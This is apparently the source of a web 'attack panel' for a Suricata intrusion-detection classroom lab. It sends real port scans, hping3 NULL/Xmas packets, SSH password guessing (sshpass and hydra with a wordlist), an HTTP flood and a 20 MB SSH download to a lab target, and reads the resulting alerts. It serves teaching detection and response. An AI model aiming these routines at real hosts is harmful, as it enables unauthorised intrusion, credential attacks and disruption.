#!/usr/bin/env python3
"""
Attack Panel for the IDS lab (runs inside the attacker container).

Every action on the page sends REAL traffic from the attacker to the target:
  - Website:  each page you open is a real HTTP visit (proxied from here, so the
              source address Suricata sees is the attacker).
  - Scanner:  real TCP connection attempts, fast (ports 1-1000) or slow.
  - Packets:  one real hand-built TCP packet per click (hping3).
  - SSH:      real SSH logins; after the right password, a real SSH session.
  - Steal:    a real 20 MB download over that SSH session.
  - Flood:    N real website connections at once.
  - Scripts:  the lab's original attack scripts, unchanged.
Alerts are read ONLY from Suricata's eve.json. The counters on the page only
count this page's own actions; they never decide whether you were caught.

Python standard library only. Open http://localhost:8080 after `docker compose up -d`.
"""
import json
import os
import re
import signal
import socket
import subprocess
import threading
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

EVE = os.environ.get("EVE_PATH", "/var/log/suricata/eve.json")
SCRIPTS = os.environ.get("SCRIPTS_DIR", "/scripts")
TARGET = os.environ.get("TARGET_HOST", "target")
PORT = int(os.environ.get("PANEL_PORT", "8080"))
HERE = os.path.dirname(os.path.abspath(__file__))
USER = "labuser"
CTL = "/tmp/panel-ssh-ctl"                  # SSH ControlMaster socket (one session)
LOOT = "customers_database.sql"             # the 20 MB file created on the target
LOOT_MB = 20
RESPONSE = os.environ.get("RESPONSE_DIR", "/response")   # shared with the responder container

SCENARIOS = {
    "portscan": ("scenario1_portscan.sh", "Port scan"),
    "brute": ("scenario2_sshbruteforce.sh", "Password list attack"),
    "malformed": ("scenario3_malformed.sh", "Strange packets (NULL + Xmas)"),
    "exfil": ("scenario4_exfiltration.sh", "Upload a 20 MB file"),
    "flood": ("scenario5_httpflood.sh", "Website flood"),
    "slow": ("evasion_slow_scan.sh", "Slow scan (about 4 minutes)"),
}

RULES = {
    1000001: ("Rule 1", "Port scan", "One machine tried 20 or more ports within 10 seconds.", "recon"),
    1000002: ("Rule 2", "Password guessing", "5 or more SSH logins within 10 seconds.", "breakin"),
    1000003: ("Rule 3", "NULL scan", "A TCP packet with no flags at all. Normal traffic never does this.", "recon"),
    1000004: ("Rule 4", "Xmas scan", "FIN, PUSH and URG set together. Normal traffic never does this.", "recon"),
    1000005: ("Rule 5", "Website flood", "4 or more new website connections within 10 seconds.", "disrupt"),
    1000006: ("Rule 6", "Slow scan", "4 or more tries on unusual ports within 90 seconds.", "recon"),
    1000007: ("Rule 7", "Data theft", "One connection moved more than 1 MB.", "steal"),
}

SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "LogLevel=ERROR", "-o", "ConnectTimeout=5"]
SAFE_CMDS = {"whoami", "hostname", "id", "pwd", "ls", "uname", "date", "cat", "head",
             "wc", "df", "uptime", "du"}
SAFE_ARG = re.compile(r"^[A-Za-z0-9._/~=+-]+$")


def resolve(name):
    try:
        return socket.gethostbyname(name)
    except OSError:
        return None


def my_lab_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((TARGET, 9))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return None


class State:
    def __init__(self):
        self.lock = threading.Lock()
        self.alerts, self.next_id, self.stats = [], 1, {}
        self.marks = []                       # (time, dest_port) of this page's new connections
        self.job = {"running": False, "kind": None, "name": None, "log": [], "code": None}
        self.proc = None
        self.scan = {"running": False, "mode": None, "map": "", "open": [], "done": 0,
                     "total": 0, "next_in": None, "stop": False}
        self.steal = {"running": False, "bytes": 0, "total": LOOT_MB * 1048576,
                      "done": False, "error": None}
        self.me, self.benign = my_lab_ip(), resolve("benign")
        self.pw = None                        # the SSH password, once the attacker finds it


S = State()


def mark(port, n=1):
    t = time.time()
    with S.lock:
        S.marks.extend([(t, port)] * n)
        S.marks = [m for m in S.marks if t - m[0] < 95]


def counters():
    t = time.time()
    with S.lock:
        m = list(S.marks)
    in10 = [p for (ts, p) in m if t - ts < 10]
    return {"r1": len(in10), "r2": sum(1 for p in in10 if p == 22),
            "r5": sum(1 for p in in10 if p == 80),
            "r6": sum(1 for (ts, p) in m if t - ts < 90 and p not in (22, 80))}


# ---------------------------------------------------------------- defender (responder) status
def defense():
    try:
        with open(os.path.join(RESPONSE, "status.json")) as f:
            d = json.load(f)
    except (OSError, ValueError):
        return {"running": False, "config": {"enabled": False, "sids": [], "duration": 0},
                "blocks": {}, "me_blocked": False}
    d["running"] = time.time() - d.get("updated", 0) < 15
    for ip, b in d.get("blocks", {}).items():
        b["who"] = "you" if ip == S.me else ("normal user" if ip == S.benign else "other")
        b["left"] = max(0, int(b["until"] - time.time())) if b.get("until") else None
    d["me_blocked"] = bool(S.me and S.me in d.get("blocks", {}))
    return d


def set_defense(cfg):
    sids = [int(x) for x in cfg.get("sids", []) if int(x) in RULES]
    out = {"enabled": bool(cfg.get("enabled")), "sids": sids,
           "duration": max(0, min(int(cfg.get("duration", 20)), 3600))}
    tmp = os.path.join(RESPONSE, "config.json.tmp")
    with open(tmp, "w") as f:
        json.dump(out, f)
    os.replace(tmp, os.path.join(RESPONSE, "config.json"))
    return out


def request_unblock(ip="all"):
    try:
        with open(os.path.join(RESPONSE, "unblock"), "w") as f:
            f.write(ip or "all")
        return "Unblocking..."
    except OSError as e:
        return f"Could not reach the defender: {e}"


# ---------------------------------------------------------------- eve.json
def tail_eve():
    pos, buf = None, ""
    while True:
        try:
            size = os.path.getsize(EVE)
            if pos is None:
                pos = size
            if size < pos:
                pos = 0
            if size > pos:
                with open(EVE, "r", encoding="utf-8", errors="replace") as f:
                    f.seek(pos)
                    buf += f.read()
                    pos = f.tell()
                *lines, buf = buf.split("\n")
                for line in lines:
                    handle_event(line)
        except FileNotFoundError:
            pass
        except Exception as e:
            print("eve tail error:", e, flush=True)
        time.sleep(0.5)


def handle_event(line):
    try:
        ev = json.loads(line)
    except ValueError:
        return
    kind = ev.get("event_type")
    if kind == "alert":
        a = ev.get("alert", {})
        sid = a.get("signature_id")
        rule = RULES.get(sid, ("Rule ?", a.get("signature", "Alert"), "", ""))
        src, dst = ev.get("src_ip"), ev.get("dest_ip")
        who = ("you" if S.me and S.me in (src, dst) else
               "normal user" if S.benign and S.benign in (src, dst) else "other")
        with S.lock:
            S.alerts.append({"id": S.next_id, "ts": ev.get("timestamp"), "sid": sid,
                             "rule": rule[0], "name": rule[1], "why": rule[2], "stage": rule[3],
                             "src": src, "dst": dst, "dport": ev.get("dest_port"), "who": who})
            S.next_id += 1
            S.alerts = S.alerts[-400:]
    elif kind == "stats":
        st = ev.get("stats", {})
        cap = st.get("capture", {})
        with S.lock:
            S.stats = {"ts": ev.get("timestamp"), "seen": cap.get("kernel_packets"),
                       "dropped": cap.get("kernel_drops")}


# ---------------------------------------------------------------- website
def fetch_site(path):
    path = path.lstrip("/") or "index.html"
    if ".." in path or not re.match(r"^[A-Za-z0-9._/-]*$", path):
        return 400, b"bad path", "text/plain"
    mark(80)
    try:
        with urllib.request.urlopen(f"http://{TARGET}/{path}", timeout=5) as r:
            return r.status, r.read(), r.headers.get("Content-Type", "text/html")
    except urllib.error.HTTPError as e:
        return e.code, e.read(), "text/html"
    except Exception:
        return 502, b"<h3 style='font-family:sans-serif'>The website did not answer.</h3>", "text/html"


def flood(n):
    n = max(1, min(int(n), 20))
    mark(80, n)

    def one(_):
        t0 = time.time()
        try:
            with urllib.request.urlopen(f"http://{TARGET}/", timeout=5) as r:
                r.read()
                ok = r.status == 200
        except Exception:
            ok = False
        return {"ms": int((time.time() - t0) * 1000), "ok": ok}

    with ThreadPoolExecutor(max_workers=n) as ex:
        return list(ex.map(one, range(n)))


# ---------------------------------------------------------------- scanner
def scan_worker(mode):
    ports = list(range(1, 1001)) if mode == "fast" else list(range(1, 16))
    with S.lock:
        S.scan = {"running": True, "mode": mode, "map": "." * 1000, "open": [], "done": 0,
                  "total": len(ports), "next_in": None, "stop": False}

    def probe(p):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            rc = s.connect_ex((TARGET, p))
        except OSError:
            rc = -1
        finally:
            s.close()
        mark(p)
        with S.lock:
            m = S.scan["map"]
            # o = open, c = closed (target said "nobody here"), x = no answer (blocked)
            st = "o" if rc == 0 else ("c" if rc == 111 else "x")
            S.scan["map"] = m[:p - 1] + st + m[p:]
            S.scan["done"] += 1
            if rc == 0:
                S.scan["open"].append(p)

    if mode == "fast":
        with ThreadPoolExecutor(max_workers=48) as ex:
            for p in ports:
                if S.scan["stop"]:
                    break
                ex.submit(probe, p)
    else:
        for i, p in enumerate(ports):
            if S.scan["stop"]:
                break
            probe(p)
            if i < len(ports) - 1:
                for left in range(15, 0, -1):
                    if S.scan["stop"]:
                        break
                    with S.lock:
                        S.scan["next_in"] = left
                    time.sleep(1)
    with S.lock:
        S.scan["running"] = False
        S.scan["next_in"] = None
        S.scan["open"].sort()


# ---------------------------------------------------------------- packets
FLAG_OPT = {"SYN": "-S", "ACK": "-A", "FIN": "-F", "RST": "-R", "PSH": "-P", "URG": "-U"}


def send_packet(flags, port):
    flags = [f for f in flags if f in FLAG_OPT]
    cmd = ["hping3", "-c", "1", "-p", str(port)] + [FLAG_OPT[f] for f in flags] + [TARGET]
    if flags == ["SYN"]:
        mark(port)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
        out = (r.stdout + r.stderr).strip()
    except Exception as e:
        out = f"hping3 failed: {e}"
    return {"cmd": " ".join(cmd), "output": out}


# ---------------------------------------------------------------- SSH
def ssh_session_alive():
    r = subprocess.run(["ssh", "-o", f"ControlPath={CTL}", "-O", "check", f"{USER}@{TARGET}"],
                       capture_output=True)
    return r.returncode == 0


def ssh_login(pw):
    """One real login attempt (one new connection to port 22). If the password is
    right, that same connection stays open as our SSH session (ControlMaster)."""
    mark(22)
    if ssh_session_alive():
        subprocess.run(["ssh", "-o", f"ControlPath={CTL}", "-O", "exit", f"{USER}@{TARGET}"],
                       capture_output=True)
    cmd = ["sshpass", "-p", pw, "ssh"] + SSH_OPTS + [
        "-o", "NumberOfPasswordPrompts=1", "-o", "PubkeyAuthentication=no",
        "-o", "PreferredAuthentications=password",
        "-o", "ControlMaster=yes", "-o", f"ControlPath={CTL}", "-o", "ControlPersist=900",
        "-fN", f"{USER}@{TARGET}"]
    try:
        code = subprocess.run(cmd, capture_output=True, timeout=15).returncode
    except subprocess.TimeoutExpired:
        code = -1
    if code != 0 and code != 5 and ssh_session_alive():
        code = 0                      # session is up even if sshpass was slow to return
    if code == 0:
        S.pw = pw                     # the password the attacker found
        # Put the "valuable" file on the target, through the session we just opened.
        ssh_run(f"test -f ~/{LOOT} || head -c {LOOT_MB * 1048576} /dev/urandom > ~/{LOOT}", timeout=30)
        return {"ok": True, "lines": ["Welcome! You are now logged in to target as labuser.",
                                      "Type a command (try: whoami, ls -lh, hostname) or steal the file below."]}
    if code == 5:
        return {"ok": False, "lines": ["Permission denied, please try again."]}
    return {"ok": False, "lines": ["ssh: could not reach target port 22."]}


def ssh_run(remote, timeout=10):
    cmd = ["ssh"] + SSH_OPTS + ["-o", "BatchMode=yes", "-o", f"ControlPath={CTL}",
                                "-o", "ControlMaster=no", f"{USER}@{TARGET}", remote]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, (r.stdout + r.stderr).rstrip()
    except subprocess.TimeoutExpired:
        return -1, "(timed out)"


def ssh_command(line):
    parts = line.strip().split()
    if not parts:
        return {"lines": []}
    if parts[0] == "help":
        return {"lines": ["Allowed in this demo: " + ", ".join(sorted(SAFE_CMDS)) + ", exit"]}
    if parts[0] in ("exit", "logout"):
        subprocess.run(["ssh", "-o", f"ControlPath={CTL}", "-O", "exit", f"{USER}@{TARGET}"],
                       capture_output=True)
        return {"lines": ["logout", "Connection to target closed."], "logged_out": True}
    if parts[0] not in SAFE_CMDS or not all(SAFE_ARG.match(p) for p in parts[1:]):
        return {"lines": [f"{parts[0]}: not allowed in this demo (type help)"]}
    if not ssh_session_alive():
        return {"lines": ["Not logged in. Guess the password first."], "logged_out": True}
    _, out = ssh_run(" ".join(parts))
    return {"lines": out.split("\n") if out else []}


def ssh_cmd_for(remote):
    """Use the open SSH session if there is one; otherwise log in again with the
    password the attacker already found (one more connection to port 22)."""
    if ssh_session_alive():
        return ["ssh"] + SSH_OPTS + ["-o", "BatchMode=yes", "-o", f"ControlPath={CTL}",
                                     "-o", "ControlMaster=no", f"{USER}@{TARGET}", remote]
    if S.pw:
        mark(22)
        return ["sshpass", "-p", S.pw, "ssh"] + SSH_OPTS + [
            "-o", "PubkeyAuthentication=no", "-o", "PreferredAuthentications=password",
            "-o", "ControlMaster=no", "-o", "ControlPath=none", f"{USER}@{TARGET}", remote]
    return None


def steal_worker():
    """Real download of the 20 MB file over SSH. Reading is paced so the class
    can watch the progress bar; Rule 7 fires once more than 1 MB has moved."""
    def fail(msg):
        with S.lock:
            S.steal["error"], S.steal["running"] = msg, False

    with S.lock:
        S.steal = {"running": True, "bytes": 0, "total": LOOT_MB * 1048576, "done": False,
                   "error": None, "phase": "Preparing the file on the target..."}
    prep = ssh_cmd_for(f"test -s ~/{LOOT} || head -c {LOOT_MB * 1048576} /dev/urandom > ~/{LOOT}")
    if prep is None:
        return fail("Log in first: guess the password in the terminal.")
    try:
        r = subprocess.run(prep, capture_output=True, text=True, timeout=60)
        if r.returncode != 0:
            return fail("Could not prepare the file: " + (r.stderr.strip() or f"exit code {r.returncode}"))
    except Exception as e:
        return fail(f"Could not prepare the file: {e}")
    cmd = ssh_cmd_for(f"cat ~/{LOOT}")
    if cmd is None:
        return fail("Log in first: guess the password in the terminal.")
    with S.lock:
        S.steal["phase"] = "Downloading"
    cut = {"by_defender": False, "stalled": False}
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        last = {"t": time.time()}

        def watchdog():
            # If the defender blocks us, packets are dropped and the download just
            # freezes. Notice that and end the frozen connection.
            while p.poll() is None:
                time.sleep(0.4)
                idle = time.time() - last["t"]
                if defense()["me_blocked"] and idle > 1.5:
                    cut["by_defender"] = True
                elif idle > 25:
                    cut["stalled"] = True
                else:
                    continue
                p.kill()
                return

        threading.Thread(target=watchdog, daemon=True).start()
        with open("/tmp/stolen_" + LOOT, "wb") as out:
            while True:
                chunk = p.stdout.read(262144)
                if not chunk:
                    break
                last["t"] = time.time()
                out.write(chunk)
                with S.lock:
                    S.steal["bytes"] += len(chunk)
                time.sleep(0.12)
        err = p.stderr.read().decode(errors="replace").strip()
        code = p.wait()
        with S.lock:
            mb = S.steal["bytes"] / 1048576
            if cut["by_defender"] or (defense()["me_blocked"] and S.steal["bytes"] < S.steal["total"]):
                S.steal["blocked"] = True
                S.steal["error"] = (f"STOPPED at {mb:.1f} MB of {LOOT_MB} MB: Suricata raised Rule 7 and "
                                    "the defender blocked your IP, so the download was cut.")
            elif cut["stalled"]:
                S.steal["error"] = f"The download froze at {mb:.1f} MB and was stopped."
            else:
                S.steal["done"] = S.steal["bytes"] >= S.steal["total"]
                if not S.steal["done"]:
                    S.steal["error"] = "Download failed: " + (err or f"exit code {code}")
    except Exception as e:
        with S.lock:
            S.steal["error"] = f"Download failed: {e}"
    with S.lock:
        S.steal["running"] = False


# ---------------------------------------------------------------- subprocess jobs
def start_job(kind, name, argv):
    with S.lock:
        if S.job["running"]:
            return False, "Another attack is still running. Stop it first."
        S.job = {"running": True, "kind": kind, "name": name, "log": ["$ " + " ".join(argv)], "code": None}
    p = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                         bufsize=1, start_new_session=True)
    S.proc = p

    def reader():
        for line in p.stdout:
            with S.lock:
                S.job["log"].append(line.rstrip())
                S.job["log"] = S.job["log"][-300:]
        code = p.wait()
        with S.lock:
            S.job["running"], S.job["code"] = False, code
            S.job["log"].append(f"[finished, exit code {code}]")

    threading.Thread(target=reader, daemon=True).start()
    return True, f"{name} started."


def stop_all():
    p = S.proc
    if p and p.poll() is None:
        try:
            os.killpg(p.pid, signal.SIGTERM)
        except OSError:
            pass
    with S.lock:
        S.scan["stop"] = True
    return "Stopped."


# ---------------------------------------------------------------- web server
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def send(self, code, body, ctype="application/json"):
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def body(self):
        n = int(self.headers.get("Content-Length") or 0)
        try:
            return json.loads(self.rfile.read(n)) if n else {}
        except ValueError:
            return {}

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/":
            with open(os.path.join(HERE, "index.html"), "rb") as f:
                return self.send(200, f.read(), "text/html; charset=utf-8")
        if path.startswith("/site/") or path == "/site":
            code, data, ctype = fetch_site(path[len("/site"):])
            return self.send(code, data, ctype)
        if path == "/api/state":
            since = 0
            m = re.search(r"since=(\d+)", self.path)
            if m:
                since = int(m.group(1))
            c = counters()
            with S.lock:
                return self.send(200, {
                    "me": S.me, "benign": S.benign, "eve_found": os.path.exists(EVE),
                    "alerts": [a for a in S.alerts if a["id"] > since][-150:],
                    "last_id": S.next_id - 1, "stats": S.stats, "counters": c,
                    "job": dict(S.job, log=S.job["log"][-80:]),
                    "scan": {k: v for k, v in S.scan.items() if k != "stop"},
                    "steal": dict(S.steal), "defense": defense()})
        if path == "/api/passwords":
            try:
                with open("/wordlist.txt") as f:
                    return self.send(200, {"words": [w.strip() for w in f if w.strip()]})
            except OSError:
                return self.send(200, {"words": []})
        if path == "/api/session":
            return self.send(200, {"logged_in": ssh_session_alive()})
        self.send(404, {"error": "not found"})

    def do_POST(self):
        b, p = self.body(), self.path
        if p == "/api/ssh/login":
            pw = str(b.get("password", ""))[:64]
            return self.send(200, ssh_login(pw) if pw else {"ok": False, "lines": ["(empty password)"]})
        if p == "/api/ssh/cmd":
            return self.send(200, ssh_command(str(b.get("cmd", ""))[:200]))
        if p == "/api/ssh/hydra":
            ok, msg = start_job("hydra", "Hydra", ["hydra", "-l", USER, "-P", "/wordlist.txt",
                                                    "-t", "4", "-f", "-V", f"ssh://{TARGET}"])
            return self.send(200 if ok else 409, {"result": msg})
        if p == "/api/steal":
            if S.steal["running"]:
                return self.send(409, {"result": "Already downloading."})
            if defense()["me_blocked"]:
                return self.send(409, {"result": "You are blocked by the defender. Wait for the countdown or press Unblock."})
            if not (S.pw or ssh_session_alive()):
                return self.send(409, {"result": "Log in first: guess the password in the terminal."})
            threading.Thread(target=steal_worker, daemon=True).start()
            return self.send(200, {"result": "Download started."})
        if p == "/api/scan":
            mode = b.get("mode")
            if mode not in ("fast", "slow"):
                return self.send(400, {"result": "Unknown mode."})
            if S.scan["running"]:
                return self.send(409, {"result": "A scan is already running."})
            threading.Thread(target=scan_worker, args=(mode,), daemon=True).start()
            return self.send(200, {"result": "Scan started."})
        if p == "/api/packet":
            try:
                port = int(b.get("port", 80))
                assert 1 <= port <= 65535
            except Exception:
                return self.send(400, {"output": "Port must be 1 to 65535."})
            return self.send(200, send_packet(list(b.get("flags", [])), port))
        if p == "/api/flood":
            try:
                return self.send(200, {"results": flood(b.get("n", 6))})
            except ValueError:
                return self.send(400, {"results": []})
        if p == "/api/run":
            key = b.get("scenario")
            if key not in SCENARIOS:
                return self.send(400, {"result": "Unknown attack."})
            script, label = SCENARIOS[key]
            ok, msg = start_job("script", label, ["sh", os.path.join(SCRIPTS, script), "panel"])
            return self.send(200 if ok else 409, {"result": msg})
        if p == "/api/unblock":
            return self.send(200, {"result": request_unblock(str(b.get("ip") or "all"))})
        if p == "/api/defense":
            try:
                return self.send(200, {"config": set_defense(b)})
            except (OSError, ValueError, TypeError) as e:
                return self.send(500, {"result": f"Could not save: {e}"})
        if p == "/api/stop":
            return self.send(200, {"result": stop_all()})
        self.send(404, {"error": "not found"})


if __name__ == "__main__":
    threading.Thread(target=tail_eve, daemon=True).start()
    print(f"Attack panel on port {PORT}. Attacker IP: {S.me}. Normal user IP: {S.benign}", flush=True)
    ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
